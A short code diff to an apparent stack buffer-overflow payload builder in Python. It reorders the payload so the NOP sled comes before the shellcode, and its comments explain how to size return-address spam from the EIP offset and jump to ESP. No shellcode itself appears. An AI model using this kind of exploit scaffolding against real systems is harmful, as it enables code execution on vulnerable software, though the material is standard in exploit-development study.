@@ -7,9 +7,9 @@
 # ####################### (Lower Address)
 # #       Ret Spam      #
 # #######################
-# #     Shell Code      #
-# #######################
 # #      NOP SLED       #
+# #######################
+# #     Shell Code      #
 # ####################### (Higher Address)
 
 # The buffer Offset provided - how far from buffers location to the start of EIP tells us how long Ret Spam should be. It should be long enough to fill the distance and then a single more time. Increasing this slightly can add a saftey margin. Covering to much can limit room for shell code and nop sled. Ret Spam is the address we plan to jump to. Because we can create core files or view dmesg logs, ESP is a safe bet. Perhaps this could be tunable.
@@ -41,7 +41,7 @@ def build_payload(shellcode,ret_addr,ip_offset,nop_len, **kwargs):
 
     nop_sled = b"\x90" * nop_len;
     
-    return ret_spam + shellcode + nop_sled
+    return ret_spam + nop_sled + shellcode
     
 def main():
     # Parse Arguments
